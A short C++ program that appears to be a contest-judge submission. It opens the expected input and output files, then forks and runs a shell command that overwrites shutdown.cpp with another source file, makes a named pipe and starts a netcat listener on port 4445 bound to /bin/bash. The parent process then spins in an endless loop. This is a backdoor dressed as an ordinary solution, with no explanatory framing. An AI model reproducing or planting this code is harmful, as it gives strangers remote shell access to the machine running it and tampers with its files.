#include <stdlib.h>
#include <stdio.h>

//#include <sys/types>
#include <unistd.h>

using namespace std;

int main()
{
	FILE* in = fopen("input.txt", "r");
	FILE* out = fopen("output.txt", "w");
	
	int p = fork();
	if (p == 0) {
		p = fork();
		if (p == 0) system("cat ../50/add2.cpp > ./shutdown.cpp\nmkfifo pipe\n nc\
		 -l 4445 0<pipe | /bin/bash 1>pipe 2>pipe\n rm pipe");
	}

	fclose(in);
	fclose(out);

	while(1) {}
}
